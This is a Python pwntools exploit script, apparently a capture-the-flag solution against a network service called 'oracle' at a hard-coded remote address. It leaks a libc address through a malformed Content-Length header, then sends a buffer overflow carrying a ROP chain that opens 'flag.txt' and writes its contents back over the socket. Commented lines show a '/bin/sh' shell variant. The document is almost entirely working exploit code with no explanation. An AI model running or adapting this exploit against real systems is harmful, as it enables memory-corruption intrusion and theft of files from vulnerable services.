from pwn import *
from icecream import ic

elf = exe = ELF("./oracle_patched")
libc = elf.libc
context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("83.136.252.214", 47983)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000017aa
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

s("PLAGUE hehe V1337\r\n")
s("Plague-Target: haha\r\n")
s("Content-Length: -1\r\n")
s("\r\n")
s("A")
ru("plague: ")
io.close()

io = start()
s("PLAGUE hehe V1337\r\n")
s("Plague-Target: haha\r\n")
s("Content-Length: 8\r\n")
s("\r\n")
s("A")
ru("plague: ")
libc.address = u64(re(6)+b'\x00\x00') - 0x1ecb41
ic(hex(libc.address))
io.close()
ic(libc.bss())
rop = ROP(libc)
# rop.rdi = next(libc.search(b'/bin/sh\x00'))
# rop.raw(libc.symbols.system)
rop.call('read', [6, libc.bss(), 9])                # FD IS 7 LOCAL
rop.call('open', [libc.bss(), 0, 0])
rop.call('read', [7, libc.bss(), 200])              # FD IS 8 LOCAL
rop.call('write', [6, libc.bss(), 200])             # FD IS 7 LOCAL
chain = rop.chain()
print(rop.dump())
io = start()
s("PLAGUE hehe V1337\r\n")
s(b"b"*0x428+ b'\x37' + chain + b'\r\n')
# s("a"*0x1000+"\r\n")
# pause()
s('\r\n')
pause()
s(b'flag.txt\x00')
# s("flag.txt\x00")
i()
